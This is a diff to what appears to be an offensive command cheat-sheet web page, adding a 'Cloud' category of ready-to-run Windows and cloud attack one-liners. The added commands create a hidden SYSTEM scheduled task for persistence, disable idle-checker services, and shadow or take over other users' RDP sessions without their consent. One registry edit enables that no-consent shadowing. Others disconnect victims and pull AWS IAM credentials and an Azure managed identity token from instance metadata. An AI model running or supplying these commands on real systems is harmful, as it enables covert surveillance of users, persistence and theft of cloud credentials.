@@ -109,6 +109,8 @@
   .tag.playbook.active { background: #ffeb3b; color: #000; }
   .tag.recon { color: #4caf50; border-color: #4caf50; }
   .tag.recon.active { background: #4caf50; color: #000; }
+  .tag.cloud { color: #03a9f4; border-color: #03a9f4; }
+  .tag.cloud.active { background: #03a9f4; color: #000; }
   .cmd-tag.c2 { color: #ff6b35; border-color: #ff6b35; }
   .cmd-tag.privesc { color: #9b59b6; border-color: #9b59b6; }
   .cmd-tag.persist { color: #e74c3c; border-color: #e74c3c; }
@@ -118,6 +120,7 @@
   .cmd-tag.lateral { color: #00bcd4; border-color: #00bcd4; }
   .cmd-tag.playbook { color: #ffeb3b; border-color: #ffeb3b; }
   .cmd-tag.recon { color: #4caf50; border-color: #4caf50; }
+  .cmd-tag.cloud { color: #03a9f4; border-color: #03a9f4; }
   .cmd-count {
     text-align: center;
     font-size: 0.6rem;
@@ -216,20 +219,20 @@
 </div>
 
 <div class="filter-tags">
-  <div class="tag vps" data-filter="vps">VPS</div>
-  <div class="tag ps" data-filter="ps">PowerShell</div>
-  <div class="tag defender" data-filter="defender">Defender</div>
-  <div class="tag linux" data-filter="linux">Linux</div>
-  <div class="tag git" data-filter="git">Git</div>
-  <div class="tag c2" data-filter="c2">C2</div>
-  <div class="tag privesc" data-filter="privesc">PrivEsc</div>
-  <div class="tag persist" data-filter="persist">Persist</div>
-  <div class="tag firewall" data-filter="firewall">Firewall</div>
-  <div class="tag evasion" data-filter="evasion">Evasion</div>
-  <div class="tag postexploit" data-filter="postexploit">Post-Exploit</div>
-  <div class="tag lateral" data-filter="lateral">Lateral</div>
   <div class="tag playbook" data-filter="playbook">Playbook</div>
   <div class="tag recon" data-filter="recon">Recon</div>
+  <div class="tag defender" data-filter="defender">Defender</div>
+  <div class="tag evasion" data-filter="evasion">Evasion</div>
+  <div class="tag privesc" data-filter="privesc">PrivEsc</div>
+  <div class="tag postexploit" data-filter="postexploit">Post-Exploit</div>
+  <div class="tag persist" data-filter="persist">Persist</div>
+  <div class="tag lateral" data-filter="lateral">Lateral</div>
+  <div class="tag c2" data-filter="c2">C2</div>
+  <div class="tag cloud" data-filter="cloud">Cloud</div>
+  <div class="tag ps" data-filter="ps">PowerShell</div>
+  <div class="tag linux" data-filter="linux">Linux</div>
+  <div class="tag vps" data-filter="vps">VPS</div>
+  <div class="tag firewall" data-filter="firewall">Firewall</div>
 </div>
 
 <div class="cmd-count" id="count">Loading...</div>
@@ -2086,6 +2089,138 @@ const COMMANDS = [
     code: "watch -n 1 'ls -la /keys/'",
     tags: ["linux", "c2"],
     accent: "#00ff41"
+  },
+  {
+    title: "[CLOUD] Find Idle/Shutdown Services",
+    code: "Get-Service | Where-Object {$_.DisplayName -match 'shutdown|idle|timeout|checker'} | Select-Object Name, DisplayName, Status, StartType",
+    tags: ["ps", "cloud", "recon"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] Disable Idle Checker",
+    code: "Get-Service | Where-Object {$_.DisplayName -match 'Idle'} | Stop-Service -Force -PassThru | Set-Service -StartupType Disabled",
+    tags: ["ps", "cloud", "persist"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] Keep-Alive Task (5min)",
+    code: "schtasks /create /tn 'KeepAlive' /tr 'powershell -w hidden -c Get-Date' /sc minute /mo 5 /ru SYSTEM /f",
+    tags: ["cmd", "cloud", "persist"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] Verify Keep-Alive",
+    code: "schtasks /query /tn 'KeepAlive'",
+    tags: ["cmd", "cloud", "recon"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] Remove Keep-Alive",
+    code: "schtasks /delete /tn 'KeepAlive' /f",
+    tags: ["cmd", "cloud"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] Mouse Jiggle Anti-Idle",
+    code: "Add-Type -AssemblyName System.Windows.Forms; while($true){$p=[System.Windows.Forms.Cursor]::Position;[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(($p.X+1),$p.Y);Start-Sleep -ms 100;[System.Windows.Forms.Cursor]::Position=$p;Start-Sleep -s 300}",
+    tags: ["ps", "cloud", "persist"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] RDP List Sessions",
+    code: "qwinsta",
+    tags: ["cmd", "cloud", "recon"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] RDP Shadow (View Only)",
+    code: "mstsc /shadow:SESSION_ID /noConsentPrompt",
+    tags: ["cmd", "cloud", "postexploit"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] RDP Shadow (Full Control)",
+    code: "mstsc /shadow:SESSION_ID /noConsentPrompt /control",
+    tags: ["cmd", "cloud", "postexploit"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] Enable Shadow No Consent",
+    code: "reg add 'HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows NT\\\\Terminal Services' /v Shadow /t REG_DWORD /d 2 /f",
+    tags: ["cmd", "cloud", "persist"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] Disable Shadow",
+    code: "reg add 'HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows NT\\\\Terminal Services' /v Shadow /t REG_DWORD /d 0 /f",
+    tags: ["cmd", "cloud", "defender"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] Check Shadow Policy",
+    code: "reg query 'HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows NT\\\\Terminal Services' /v Shadow",
+    tags: ["cmd", "cloud", "recon"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] Session 0 = No Desktop",
+    code: "echo 'Session 0 is services session - no GUI. Beacons run here. RDP sessions start at ID 2+'",
+    tags: ["cmd", "cloud", "recon"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] Check Current Session",
+    code: "qwinsta | findstr '>'",
+    tags: ["cmd", "cloud", "recon"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] Logoff User Session",
+    code: "logoff SESSION_ID",
+    tags: ["cmd", "cloud", "postexploit"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] Disconnect User (Keep Alive)",
+    code: "tsdiscon SESSION_ID",
+    tags: ["cmd", "cloud", "postexploit"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] Send Message to Session",
+    code: "msg SESSION_ID 'Your message here'",
+    tags: ["cmd", "cloud", "postexploit"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] Azure IMDS Check",
+    code: "Invoke-RestMethod -Headers @{'Metadata'='true'} -Uri 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'",
+    tags: ["ps", "cloud", "recon"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] AWS IMDS Check",
+    code: "Invoke-RestMethod -Uri 'http://169.254.169.254/latest/meta-data/'",
+    tags: ["ps", "cloud", "recon"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] GCP Metadata Check",
+    code: "Invoke-RestMethod -Headers @{'Metadata-Flavor'='Google'} -Uri 'http://169.254.169.254/computeMetadata/v1/'",
+    tags: ["ps", "cloud", "recon"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] AWS Creds from IMDS",
+    code: "Invoke-RestMethod -Uri 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
+    tags: ["ps", "cloud", "postexploit"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "[CLOUD] Azure Managed Identity Token",
+    code: "Invoke-RestMethod -Headers @{'Metadata'='true'} -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
+    tags: ["ps", "cloud", "postexploit"],
+    accent: "#03a9f4"
   },
 ];
 
